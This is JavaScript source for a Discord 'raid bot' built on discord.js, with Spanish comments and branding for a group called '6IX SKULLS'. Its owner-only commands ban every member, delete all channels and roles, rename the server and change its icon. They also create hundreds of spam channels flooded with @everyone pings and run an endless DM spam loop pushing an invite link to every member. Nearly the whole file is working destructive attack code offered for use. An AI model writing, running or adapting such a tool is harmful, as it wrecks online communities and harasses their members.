const Discord = require('discord.js');
const config = require("./config.json"); //Aquí se exporta config.json
const client = new Discord.Client();
const chalk = require('chalk');
const fs = require('fs');
const prefix = config.prefix //Aquí se define el prefix
const {MessageEmbed} = require('discord.js')
const EventEmitter = require('events');
const emitter = new EventEmitter()
emitter.setMaxListeners(50)
const ownersid = config.ids; //Aquí se definen las ids que están en config.json


  client.on('ready', () => {
  console.log(chalk.red("\n██████╗░░█████╗░██╗██████╗░\n██╔══██╗██╔══██╗██║██╔══██╗\n██████╔╝███████║██║██║░░██║\n██╔══██╗██╔══██║██║██║░░██║\n██║░░██║██║░░██║██║██████╔╝\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░\n\n██████╗░░█████╗░████████╗\n██╔══██╗██╔══██╗╚══██╔══╝\n██████╦╝██║░░██║░░░██║░░░\n██╔══██╗██║░░██║░░░██║░░░\n██████╦╝╚█████╔╝░░░██║░░░\n╚═════╝░░╚════╝░░░░╚═╝░░░\nMADE BY KATAST."));  
  
  
  
  console.log((chalk.red(`Encendido en: ${client.user.tag}`)));
  console.log("Owners: " + ownersid)
  })  

client.on("message", message => {
  if (message.author.bot) return
    if (message.content === prefix + 'help') {
        if(!ownersid.includes(message.author.id)){
            return message.channel.send('comando no disponible')
        }

  const embed = new MessageEmbed()
              message.channel.send(embed)
message.author.send({
  embed: {
    title: 'Destructor Comandos',
    description: '**on**\nDestruye todo el servidor por completo\n**nuke**\nElimina todos los canales\n**dr**\nElimina Los Roles.\n**cr**\nCrea Roles.\n**mdall**\nEnvia mensaje directo a todos los miembros.\n**banall**\nNo creo que este comando necesite descripción.',
    image: {url: 'https://cdn.discordapp.com/attachments/1014221409368682506/1014221571444973639/20220826_084225.gif'},
    color: "000001"
  
  }
})
  }
})

client.on("message", message => {
  if (message.author.bot) return
  
    

 if (message.content === prefix + 'on') {
     if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
   
message.guild.members.cache.forEach(m => {
              m.ban()
              });
   
   message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`NUKED BY 6IX SKULLS`, {
        type: 'text'
      }).then(channel => {
         channel.send("@everyone GG");
            channel.send("@here FUCKEDS");
                channel.send("@everyone BY")
            
    
        channel.send("https://discord.gg/hZK9UgU6Td");
                 })
           
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'text'
      });
   message.guild.channels.create(`NUKED`, {
        type: 'text'
      });
   message.guild.channels.create(`BY`, {
        type: 'text'
      });
message.guild.channels.create(`6IX SKULLS`, {
        type: 'text'
      });
                  
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'text'
      })

              message.guild.members.cache.forEach(m => {
              m.ban()
              });
      
   message.guild.roles.cache.map(roles => roles.delete());
   message.guild.setName("#6IXSKULLSNEVERDIES");
              message.guild.setIcon("https://media.discordapp.net/attachments/932410975259349063/1005675640764252210/images.png")
              for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`6IXSKULLS`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        channel.send("@everyone RAID BY 6IX SKULLS https://discord.gg/hZK9UgU6Td");
        
        message.guild.members.cache.forEach(member => {
                if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
              message.delete();
              setInterval(function(){
                member.send("https://discord.gg/hZK9UgU6Td").catch(error => {});
              },450);
            })
 })
              }}
                                    
                                    

  
  
if (message.content === prefix + 'nuke') {
     if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
   
message.guild.members.cache.forEach(m => {
              m.ban()
              });
   
   message.guild.channels.cache.forEach(channel => channel.delete());
  message.guild.channels.create(`NUKED BY 6IX SKULLS`, {
        type: 'text'
      }).then(channel => {
         channel.send("@everyone GG");
            channel.send("@here FUCKEDS");
                channel.send("@everyone BY")
            
    
        channel.send("https://discord.gg/hZK9UgU6Td");
                 })
           
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'voice'
      });
   message.guild.channels.create(`NUKED`, {
        type: 'voice'
      });
   message.guild.channels.create(`BY`, {
        type: 'voice'
      });
message.guild.channels.create(`6IX SKULLS`, {
        type: 'voice'
      });
                  
   message.guild.channels.create(`†-†-†-†-†-†-†-†-†-†-†-†-†-†`, {
        type: 'voice'
      })

              message.guild.members.cache.forEach(m => {
              m.ban()
              });
      
   message.guild.roles.cache.map(roles => roles.delete());
   message.guild.setName("#6IXSKULLSNEVERDIES");
              message.guild.setIcon("https://media.discordapp.net/attachments/932410975259349063/1005675640764252210/images.png")
}
 
            
            
            
            

                        

            if(message.content === prefix + "mdall") {
              
            message.guild.members.cache.forEach(member => {
                if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
              message.delete();
    message.channel.send("> Hecho!**")
              setInterval(function(){
                member.send("https://discord.gg/hZK9UgU6Td").catch(error => {});
              },450);
            })
            }
            
            
            
    if(message.content === (prefix + 'dr')){
        if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
                   
    message.channel.send("> Hecho")
                        message.guild.roles.cache.map(roles => roles.delete()); 
                      }
        
        
if (message.content === prefix + 'cr') {
  if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
                
  message.delete();
          let roles = message.content.slice('!roles'.length);
  message.channel.send("> Hecho!")
            for (let i = 0; i <= 200; i++) {
               message.guild.roles.create({data: {name: "6S †",color: '#000001',},reason: 'razon',})
            };
             }
        
if (message.content === prefix + 'banall') {
    if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")

  if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
      message.delete();    message.channel.send("> Hecho!")
              message.guild.members.cache.forEach(m => {
              m.ban()
              });
                }
                
       
    })


 client.on('ready', () => {
    console.log('Hecho!')
    client.user.setActivity(config.estado, { type: "STREAMING" })
});          



require("http").createServer((_, res) => res.end("Bot Encendido.")).listen(8080)


              
        
        
        
client.login(tu.token)
